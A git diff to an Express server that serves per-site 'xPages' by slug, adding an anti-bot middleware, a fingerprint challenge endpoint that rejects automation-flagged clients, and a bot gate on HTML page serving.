@@ -19,6 +19,7 @@ const { initialize } = require('./database/init');
 const { setupSocket } = require('./socket/index');
 
 const { checkIpBan } = require('./middleware/ipBan');
+const antibot = require('./middleware/antibot');
 
 // Initialize database
 const db = initialize();
@@ -142,8 +143,26 @@ function getApiKeyBySlug(slug) {
   return (site && site.is_active) ? site.api_key : null;
 }
 
+// ── xPages challenge endpoint ─────────────────────────────────────────────────
+app.post('/api/xpages/challenge', express.json({ limit: '16kb' }), (req, res) => {
+  const { fp, t: targetUrl } = req.body || {};
+  if (!fp || typeof fp !== 'object') return res.status(400).json({ ok: false });
+
+  // Reject if a definitive bot flag was triggered client-side
+  const flags = Array.isArray(fp.fl) ? fp.fl : [];
+  const hardBlock = flags.some(([n, v]) => ['wd', 'ph', 'nm', 'sl'].includes(n) && v === true);
+  if (hardBlock) return res.json({ ok: false });
+
+  // Reject obviously-bot UAs echoed from the client
+  if (!fp.ua || antibot.isKnownBot(fp.ua)) return res.json({ ok: false });
+
+  antibot.setChallengeCookie(req, res);
+  const redirect = typeof targetUrl === 'string' && targetUrl.startsWith('/') ? targetUrl : '/';
+  res.json({ ok: true, r: redirect });
+});
+
 // ── Shared handler for serving an xPage slug ─────────────────────────────────
-function serveXPage(slug, page, res, next, baseHref) {
+function serveXPage(slug, page, req, res, next, baseHref) {
   // Sanitise: no path traversal
   if (slug.includes('..') || (page && page.includes('..'))) {
     return res.status(400).send('Invalid path');
@@ -159,6 +178,9 @@ function serveXPage(slug, page, res, next, baseHref) {
   if (page && !page.endsWith('.html') && page.includes('.')) {
     return next();
   }
+
+  // ── Anti-bot gate (HTML pages only) ─────────────────────────────────────────
+  if (!antibot.checkRequest(req, res)) return;
 
   if (!site || !site.api_key) {
     return next();
@@ -308,7 +330,7 @@ app.use((req, res, next) => {
           pageName += '.html';
         }
 
-        return serveXPage(slug, pageName, res, next, '/');
+        return serveXPage(slug, pageName, req, res, next, '/');
       }
     }
   } catch (err) {
@@ -327,13 +349,13 @@ app.all('/:slug/:page?', (req, res, next) => {
   const reserved = ['admin', 'api', 'socket.io', 'uploads', 'tracker.js', 'demo'];
   if (reserved.includes(slug)) return next();
 
-  serveXPage(slug, page, res, next);
+  serveXPage(slug, page, req, res, next);
 });
 
 // ── Legacy /demo/:slug/:page routes (kept for backward compatibility) ─────────
 app.all('/demo/:slug/:page?', (req, res, next) => {
   const { slug, page } = req.params;
-  serveXPage(slug, page, res, next);
+  serveXPage(slug, page, req, res, next);
 });
 
 // ── Static Asset Guard for Inactive Websites ──────────────────────────────────
